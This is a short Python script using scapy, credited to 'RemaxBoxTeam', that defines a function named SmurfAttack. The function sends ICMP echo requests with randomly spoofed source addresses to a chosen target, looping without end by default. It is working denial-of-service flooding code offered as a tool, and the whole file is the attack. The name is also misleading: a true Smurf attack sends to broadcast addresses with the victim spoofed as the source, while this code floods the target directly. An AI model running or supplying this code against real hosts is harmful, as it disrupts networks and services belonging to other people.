#! /usr/bin/env python3
# Channel RemaxBoxTeam
# lhashashinl <--M-->
from sys import version
from scapy.all import *
from scapy import *
from scapy import route
import socket

nill = 0

def SmurfAttack(Target,message,count=False):
    if(nill != 1):
        ipm = RandIP()
        icmp = ICMP(type=8,code=0)
        ip = IP(src=ipm,dst=Target,version=4,ttl=99,id=1)
        pyload = ip/icmp/message
        if(count == False):
            send(pyload,loop=1,verbose=0)
        else:
            send(pyload,count=count,verbose=0)
        return pyload
    
# RemaxBoxTeam
# lhashashinl <--M-->